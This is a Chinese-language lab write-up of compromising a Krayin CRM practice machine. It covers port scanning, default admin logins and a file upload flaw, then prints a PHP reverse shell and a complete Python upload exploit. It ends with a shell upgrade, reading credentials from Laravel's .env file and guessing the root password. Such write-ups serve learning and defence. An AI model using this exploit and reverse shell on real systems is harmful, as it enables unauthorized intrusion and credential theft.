---
date: 2026-11-11 11:01
author: 冰冰洁
title: Krayin
subtitle: 利用 Krayin CRM 文件上传获取反向 Shell，并借 Laravel 配置凭据完成 root 提权
tags:
  - "#文件上传"
  - "#靶机学习"
  - "#反向shell"
---
# 信息收集

首先使用`nmap`粗略扫描一下靶机开放的端口，结果发现与我们之前打的靶机都不一样，这个靶机开了两个端口：

![[Pasted image 20261111091027.png]]

都存在`http`服务，于是尝试使用以下命令来扫描两个端口的细节：

```bash
nmap -Pn -sT -sV -sC -O -p22,80,8080 -oA nmap/detail 192.168.56.108
```

- `nmap`：启动 Nmap 扫描工具。
- `-Pn`：跳过主机存活探测，直接扫描目标 IP。
- `-sT`：使用 TCP 连接扫描，尝试与目标端口建立完整 TCP 连接。
- `-sV`：探测开放端口上运行的服务及其版本。
- `-sC`：运行 Nmap 默认脚本，收集常见服务信息。  
    `-sTVC` 是把 `-sT`、`-sV`、`-sC` 合写。
- `-O`：根据网络响应尝试识别目标操作系统；结果是推测，不一定准确。
- `-p22,80,8080`：只扫描 22、80、8080 这三个端口。
- `-oA nmap/detail`：把结果以三种格式保存到当前目录下的 `nmap` 文件夹，文件名前缀为 `detail`：`detail.nmap`、`detail.xml`、`detail.gnmap`。需先创建 `nmap` 文件夹。

得到结果：

![[Pasted image 20261111091502.png]]

发现`80`端口是一个小游戏，`8080`端口是一个登录界面

进入小游戏没有发现什么明显的线索，主要看`8080`中的登录界面：

![[Pasted image 20261111091625.png]]

发现这个服务的名字和靶机相同，应该就是分析这个界面了，于是先进行一下信息收集，查看这个服务`krayin`有哪些漏洞：

![[Pasted image 20261111092337.png]]

发现该版本有一个**任意文件上传漏洞**

## 漏洞利用-RCE

回到该靶机页面，我们需要先登录进去，于是继续寻找

![[Pasted image 20261111092558.png]]

得到了两个默认管理员账号，尝试登录，成功

然后直接在`url`输入上述得到的漏洞信息中的路径处，得到一些源码：

![[Pasted image 20261111092938.png]]

已知这个网页存在漏洞，所以直接上传我们准备的payload：

```bash
<?php
$sock = fsockopen('192.168.56.101', 4444, $errno, $errstr, 10);
if (!$sock) {
    die("connect failed: $errstr ($errno)\n");
}
$proc = proc_open('/bin/bash -i', [0 => $sock, 1 => $sock, 2 => $sock], $pipes);
?>
```

由于这个网站只接受`post`请求，所以我们要先抓包得到一个cookie

![[Pasted image 20261111101134.png]]

在邮件界面上传一个图片，得到cookie

发现这个cookie不能用，直接自己写一个脚本让他自动识别`cookie`：

```python
import argparse
import asyncio
from urllib.parse import unquote, urljoin

import httpx
from bs4 import BeautifulSoup


async def main(target, email, password, filename):
    async with httpx.AsyncClient(verify=False, follow_redirects=True) as client:
        login_url = urljoin(target.rstrip("/") + "/", "admin/login")
        upload_url = urljoin(target.rstrip("/") + "/", "admin/tinymce/upload")

        page = await client.get(login_url, timeout=15)
        page.raise_for_status()

        soup = BeautifulSoup(page.text, "html.parser")
        token_input = soup.find("input", {"name": "_token"})
        if not token_input or not token_input.get("value"):
            raise RuntimeError("登录页中没找到 _token；确认目标登录页是否正确。")

        login = await client.post(
            login_url,
            data={
                "_token": token_input["value"],
                "email": email,
                "password": password,
            },
            timeout=15,
        )
        login.raise_for_status()

        xsrf = login.cookies.get("XSRF-TOKEN") or client.cookies.get("XSRF-TOKEN")
        if not xsrf:
            raise RuntimeError("登录响应中没有 XSRF-TOKEN；请检查账号密码和登录结果。")

        with open(filename, "rb") as f:
            response = await client.post(
                upload_url,
                files={"file": (filename, f, "image/jpeg")},
                headers={"X-XSRF-TOKEN": unquote(xsrf)},
                timeout=30,
            )

        print("HTTP:", response.status_code)
        if response.status_code == 200:
            result = response.json()
            print("[+] File uploaded successfully.")
            print("Path to file:", result.get("location", result))
        else:
            print("[-] Upload failed:")
            print(response.text)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-u", "--user", required=True)
    parser.add_argument("-p", "--password", required=True)
    parser.add_argument("-f", "--file", required=True)
    args = parser.parse_args()

    asyncio.run(main(args.target, args.user, args.password, args.file))
```

然后运行：

```bash
python exp.py \
  -t http://192.168.56.108:8080/ \
  -u 'admin@example.com' \
  -p 'admin123' \
  -f shell.php
```

![[Pasted image 20261111103842.png]]

成功，然后触发：

```bash
 curl 'http://192.168.56.108:8080/storage/tinymce/47f7da0b5ab54a28d0ceab6105713ff6.php'
```

![[Pasted image 20261111104317.png]]

成功！！（payload的ip写错了，修改之后重新写了一遍）

## 用户提权

![[Pasted image 20261111105430.png]]

最初的反向 shell 只是把 Bash 的输入输出接到了网络连接上，没有真正的伪终端（PTY）。所以会看到 `no job control`，有些交互操作、密码提示、终端快捷键也可能不好用。

于是我们升级shell：

```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
export TERM=xterm
stty raw -echo; fg
```

- `python3 -c "import pty;pty.spawn('/bin/bash')"`  
    在靶机上通过 Python 创建伪终端（PTY），并启动一个交互式 Bash。这样 shell 对终端的支持更完整。
    
- `export TERM=xterm`  
    设置终端类型为 `xterm`，让靶机上的程序知道终端支持哪些显示和控制功能，例如清屏、颜色和光标控制。
    
- `stty raw -echo; fg`  
    这一步是在 Kali 本地终端操作：先按 **Ctrl+Z** 暂停 Netcat；`stty raw -echo` 设置本地终端把按键直接传给远端，并关闭本地回显；`fg` 再恢复 Netcat 到前台。之后通常再运行 `reset` 整理终端显示。

![[Pasted image 20261111105244.png]]

Laravel 是用 **PHP 编写的 Web 应用框架**，提供路由、登录会话、CSRF 校验、控制器和文件存储等功能。Krayin CRM 是基于 Laravel 构建的应用，因此我们看一下这个的配置文件：

```bash
cat .env
```

![[Pasted image 20261111105725.png]]

在配置中发现krayin的密码，尝试登录：

![[Pasted image 20261111105926.png]]

提权成功

# root

根据`krayin`的密码猜测root的密码也是`root123`:

![[Pasted image 20261111110136.png]]

成功
